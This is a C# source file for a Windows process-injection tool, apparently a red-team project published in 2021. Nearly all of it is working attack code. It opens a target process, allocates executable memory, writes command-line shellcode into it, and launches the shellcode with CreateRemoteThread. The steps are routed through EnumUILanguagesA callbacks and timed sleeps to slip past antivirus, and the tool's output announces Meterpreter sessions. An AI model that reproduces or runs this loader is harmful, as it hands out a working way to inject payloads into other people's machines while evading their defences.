using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NativePayload_TiACBT
{
    class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }
              
        [DllImport("kernel32.dll")]
        private static extern bool EnumSystemLocalesA(AsyncSteps ops, uint dwFlags);
        [DllImport("kernel32.dll")]
        private static extern bool EnumUILanguagesA(AsyncSteps ops, uint dwFlags, IntPtr lParam);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernelbase.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        public static IntPtr s1 = IntPtr.Zero;
        public static string[] _args1 = new string[2];
        public static int len = 0;
        public static bool modes = false;
        public static void _Step1_()
        {
            string[] _args = new string[2];

            /// pid  => _args[0]
            _args[0] = _args1[0];

            /// payload  => _args[1]
            _args[1] = _args1[1];

            int XprocID = Convert.ToInt32(_args[0]);
            string Xcode = _args[1];
            string[] X = Xcode.Split(',');
            int Injection_to_PID = XprocID;
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("[!] Injection Started Time {0}", DateTime.Now.ToString());
            Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write("[>] Injecting Meterpreter Payload to ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write("Process");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine();
            Console.WriteLine("[!] Thread Injection Done Time {0}", DateTime.Now.ToString());
            Console.WriteLine();


            byte[] Xpayload = new byte[X.Length];
            len = X.Length;
            for (int i = 0; i < X.Length;)
            {
                Xpayload[i] = Convert.ToByte(X[i], 16);
                i++;
            }

            IntPtr x = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
            s1 = x;
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.DarkGray;
            if (!modes)
                Console.Write("Step1 EnumUILanguagesA::Delegate.Invoke(");
            if (modes)
                Console.Write("Step1 EnumUILanguagesA::Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", s1.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::OpenProcess]");
            Console.WriteLine();

        }
       
        public static IntPtr s2 = IntPtr.Zero;
        public static string[] _args2 = new string[2];

        public static void _Step2_()
        {

            string[] _args = new string[2];
            _args[0] = _args1[0];
            _args[1] = _args1[1].Length.ToString();
            IntPtr a = s1;

            int p = len;
            IntPtr x = VirtualAllocEx(a, IntPtr.Zero, (uint)p, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            s2 = x;
            Console.ForegroundColor = ConsoleColor.DarkGray;
            if (!modes)
                Console.Write("Step2 EnumUILanguagesA::Delegate.Invoke(");
            if (modes)
                Console.Write("Step2 EnumSystemLocalesA::Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", s2.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::VirtualAllocEx]");
            Console.WriteLine();
        }

        public static bool s3 = false;
        public static void _Step3_()
        {
            IntPtr H = s1;
            IntPtr P = s2;
            string stemp = _args1[1];

            string[] tempstr = stemp.Split(',');
            byte[] pay = Array.ConvertAll(tempstr, bity => Convert.ToByte(bity, 16));

            UIntPtr BS = UIntPtr.Zero;
            if (WriteProcessMemory(H, P, pay, (uint)pay.Length, out BS))
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                if (!modes)
                    Console.Write("Step3 EnumUILanguagesA::Delegate.Invoke(");
                if (modes)
                    Console.Write("Step3 EnumSystemLocalesA::Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}0000000", 0.ToString());
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") true ;D Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::WriteProcessMemory]");
                Console.WriteLine();
                s3 = true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                if (!modes)
                    Console.Write("Step3 EnumUILanguagesA::Delegate.Invoke(");
                if (modes)
                    Console.Write("Step3 EnumSystemLocalesA::Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}0000000", 0.ToString());
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") false ;( Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::WriteProcessMemory]");
                Console.WriteLine();
                s3 = false;
            }

        }
        public static IntPtr s4 = IntPtr.Zero;
        public static void _Step4_()
        {
            System.Threading.Thread.Sleep(Convert.ToInt32("3700"));
            uint x = 0;
            byte[] bb =  new byte[6] { 0x00,0xf0,0xf0,0xf1,0x0f,0xff };
            IntPtr PCS = s1;
            IntPtr _S_A = s2;
            IntPtr _C_R_T = CreateRemoteThread(PCS, IntPtr.Zero, 0, _S_A, IntPtr.Zero, (uint) Array.ConvertAll(bb, bity => Convert.ToByte(bity))[3], out x);
            s4 = _C_R_T;
            System.Threading.Thread.Sleep(Convert.ToInt32("1050"));
            /// close
            CloseHandle(_C_R_T);
            CloseHandle(_S_A);

            Console.ForegroundColor = ConsoleColor.DarkGray;
            if (!modes)
                Console.Write("Step4 EnumUILanguagesA::Delegate.Invoke(");
            if (modes)
                Console.Write("Step4 EnumUILanguagesA::Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", _C_R_T.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::CreateRemoteThread]");
            Console.WriteLine();
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Bingo: Meterpreter Session via Thread Injection + Async C# + Callback Functions Technique by \"EnumUILanguagesA\" ;)");
            Console.WriteLine();
        }
        public delegate void AsyncSteps();
        static void Main(string[] args)
        {
            /// <summary>
            /// .Net 3.5 / 4.0 only ;)
            /// Remote Thread Injection [4 steps] + Async C# Methods + Callback Functions Technique...
            /// </summary>
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_TiACBT , Published by Damon Mohammadbagher , Apr-May 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_TiACBT , Thread Injection + Async C# + Callback Functions Technique via (EnumUILanguagesA) API");
            Console.WriteLine();
            Console.WriteLine("Example: NativePayload_TiACBT.exe [mode 1,2] [TPID] [PAYLOAD]");
            Console.WriteLine("Example: NativePayload_TiACBT.exe 1 2187 fc,48,67,00,00,67,f1");
            /// using API Monitor & readkey
            // Console.ReadKey();
            Console.WriteLine();
            AsyncSteps CsharpMethod1 = new AsyncSteps(_Step1_);
            AsyncSteps CsharpMethod2 = new AsyncSteps(_Step2_);
            AsyncSteps CsharpMethod3 = new AsyncSteps(_Step3_);
            AsyncSteps CsharpMethod4 = new AsyncSteps(_Step4_);
            _args1[0] = args[1];
            _args1[1] = args[2];
            if (args[0] == "1")
            {
                modes = false;
                // ==> you can use EnumSystemLocalesA for all steps too.
                System.Threading.Thread.Sleep(2000);
                //bool Async1 = EnumSystemLocalesA(CsharpMethod1, 0);
                bool Async1 = EnumUILanguagesA(CsharpMethod1, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(3000);
                //bool Async2 = EnumSystemLocalesA(CsharpMethod2, 0);
                bool Async2 = EnumUILanguagesA(CsharpMethod2, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(5000);
                //bool Async3 = EnumSystemLocalesA(CsharpMethod3, 0);
                bool Async3 = EnumUILanguagesA(CsharpMethod3, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(5555);
                bool Async4 = EnumUILanguagesA(CsharpMethod4, 0, IntPtr.Zero);
                //bool Async4 = EnumSystemLocalesA(CsharpMethod4, 0);
                //Console.ReadKey();
            }
            if (args[0] == "2")
            {   /// mode 2 is good idea to test your AV for stress test ;)
                modes = true;
                // ==> you can use EnumSystemLocalesA for all steps too.
                System.Threading.Thread.Sleep(2000);
                //bool Async1 = EnumSystemLocalesA(CsharpMethod1, 0);
                bool Async1 = EnumUILanguagesA(CsharpMethod1, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(3000);
                bool Async2 = EnumSystemLocalesA(CsharpMethod2, 0);
                //bool Async2 = EnumUILanguagesA(CsharpMethod2, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(5000);
                bool Async3 = EnumSystemLocalesA(CsharpMethod3, 0);
                //bool Async3 = EnumUILanguagesA(CsharpMethod3, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(5555);
                bool Async4 = EnumUILanguagesA(CsharpMethod4, 0, IntPtr.Zero);
                //bool Async4 = EnumSystemLocalesA(CsharpMethod4, 0);
                //Console.ReadKey();
            }
        }
    }
}
